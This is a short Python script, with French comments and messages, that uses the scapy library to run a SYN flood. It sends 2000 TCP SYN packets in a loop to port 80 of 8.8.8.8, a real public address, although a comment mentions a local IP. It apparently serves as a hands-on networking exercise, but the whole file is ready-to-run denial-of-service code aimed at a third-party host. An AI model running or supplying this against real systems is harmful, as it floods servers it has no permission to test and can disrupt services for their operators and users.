from scapy.all import IP, TCP, send
import time

print("💥 Lancement d'un SYN Flood sur le port 80...")

# On cible une IP locale (ou 8.8.8.8) sur le port 80
target_ip = "8.8.8.8" 
target_port = 80

# On envoie 2000 paquets TCP SYN en boucle
for i in range(2000):
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
    send(packet, verbose=False)
    
print("✅ Flood terminé ! Regarde ton interface.")